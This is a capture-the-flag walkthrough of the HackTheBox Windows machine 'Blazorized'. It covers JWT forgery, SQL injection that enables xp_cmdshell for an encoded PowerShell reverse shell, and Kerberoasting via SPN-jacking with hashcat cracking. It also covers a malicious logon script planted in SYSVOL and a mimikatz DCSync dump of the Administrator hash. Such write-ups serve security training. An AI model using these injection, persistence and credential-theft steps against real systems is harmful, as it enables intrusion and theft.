---
title: HTB - Blazorized
publishDate: 2024-02-02
description: HTB - Blazorized
categories:
  - HackTheBox
tags:
  - HackTheBox
  - NTLM
  - Evil-winrm
  - nmap
  - hashcat
  - Movement-Lateral
  - Active-Directory
  - BloodHound
  - mimikatz
  - logoncount
  - Blazor
  - metasploit
  - sqlinjection
  - powershell
  - winPEAS

---

## Box Info

| Name                  | Blazorized       | 
| :-------------------- | ---------------: |
| Release Date          | 02 Mar, 2024     |
| OS                    | Windows          |
| Rated Difficulty      | Medium           |

## **Enumeration**

Tip: 
![Image](0.png)

## **Nmap**

![Image](1.png)

## Web

![Image](2.png)

Puerto{: filepath} `445 Microsoft Directory Services`

```bash
smbclient -L //blazorized.htb 
```

![Image](3.png)

## Scan Subdomains

```bash
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hc 400,403,404,302 -H "Host: FUZZ.blazorized.htb" -u http://blazorized.htb -t 100
```

![Image](4.png)

With ffuf

```bash
ffuf -c -u "http://blazorized.htb" -H "host: FUZZ.blazorized.htb" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -fc 301,302 -mc all
```

![Image](5.png)

We found a subdomain called 'admin,' and we added it to our hosts.

Web application on port 80 is built with the `Blazor WebAssembly`

![Image](6.png)

Blazor webassembly works with Js and json

![Image](7.png)

We found a script write in js

![Image](8.png)

For read better the code we need to copy and paste to beautifier.io Web.

![Image](9.png)


We found a interesting path.

![Image](10.png)

The _framework folder contains essential files for the operation of the Blazor application, including `.dll files`, `resources`, and `configuration files`.

- `/_framework/blazor.webassembly.js`: Essential for running Blazor apps
- `/_framework/wasm/`: Contains WebAssembly binaries

Download the DLLs for decompile 

![Image](11.png)

## DLL Ananlysis

Decompile DLLs using `DNSpy` in windows.

![Image](12.png)

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzIwMDAwMDAwfQ.tJptKXJlG9KDSjxR9Y3gxdcSy7fHj-50GS6_Dd9PAOk`

Build a jwt for Super_Admin

![Image](13.png)

**Set the jwt token to Local Storage:**

![Image](14.png)

We need use this for secret key for jwt (dont forget)

![Image](15.png)

Now we have to copy the string create in jwt.io web and storage local in the web.

![Image](16.png)

![Image](17.png)

In the section "Check Duplicate" from the web,It make a search in the database, if some category is duplicate, so we a exploit this with SQLinjection

![Image](18.png)

The web run a microsoft sql for a get a revshell. [Hacktricks](https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

![Image](19.png)

Now we are going to use these commands and find out if we are successful.

![Image](20.png)

```shell
test'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
```

```shell
test'; exec master..xp_cmdshell 'powershell -e *powershellBased64*';-- -
```

## Nu_1055

We got the shell!!.

![Image](21.png)

Change the shell to a meterpreter shell, create a payload, upload and execute.

![Image](22.png)

![Image](23.png)

![Image](24.png)

This practice is more convenient for executing certain commands that we cannot perform in the previous shell.

![Image](25.png)

It is a tool for visualizing relationships and permissions within an Active Directory (AD) or Azure environment (Azure Active Directory, AAD).

[BloodHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

Upload with metasploit to victim machine and execute the follow command:

```shell
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"
```
![Image](26.png)

Download with the metasploit the .zip in owner attack machine

![Image](27.png)


![Image](28.png)

![Image](29.png)

## Movement Lateral

Extract the zip and use it to BloodHound 

<https://www.freebuf.com/articles/web/288370.html>

![Image](30.png)

### WriteSPN

- BloodHound reveals that `NU_1055` has `writeSPN Privilege` on the `RSA_4801` account
- Vulnerable to SPN-jacking

![Image](31.png)

![Image](32.png)


Upload the PowerView.ps1 with metasploit and execute:

set SPN

```shell
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='test/test'}
```

Request Service Ticket

```shell
Get-DomainSPNTicket -SPN test/test
```

![Image](33.png)

<https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html>

**Tip**:  make the hash use all space in your file txt 

this :

![Image](34.png)

to this:

![Image](35.png)

#### Hashcat

Cracked the hash  with **hashcat**

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -o found.txt --force
```

![Image](36.png)

password: `(Ni7856Do9854Ki05Ng0005 #)`

![Image](37.png)

Use evil-winrm for login as RSA_4810:
```javascript
sudo evil-winrm -i blazorized.htb -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'
```

### RSA_4810

![Image](38.png)

Use the PowerView.ps1 and upload to RSA_4810 for use Get-NetUser command

![Image](39.png)

### SSA_6010

The another users has a `logoncount` 0 and the user `SSA_6010` has a logoncount 4236.

LogonCount is a login count, a property that is part of the profile information in an `Active Directory (AD)` environment.

![Image](40.png)

From Bloodhound we can see that RSA_4810 is member of group Remote_Support_Administrators.
Upload `winPEAS` and Run and it show us a writeable file path.

We have write privilege under A32FF3AEAA23 directory in SYSVOL.

icacls A32FF3AEAA23 

![Image](41.png)

```shell
'powershell -e  *base64*' | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII
```

```shell
Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\revshell.bat'
```

![Image](42.png)

Wait a second and get the shell for SSA_6010 and upload the SharpHound or look again 
and see the option "Find Principals with DCSync Rights" and see the SSA_6010 has a DCSync

![Image](43.png)

Upload a mimikatz.exe and execute the following command:

lsadump::dcsync /domain:blazorized.htb /user:Administrator

![Image](44.png)

And we got the NTHASH for used in evil-winrm

![Image](45.png)

Rooted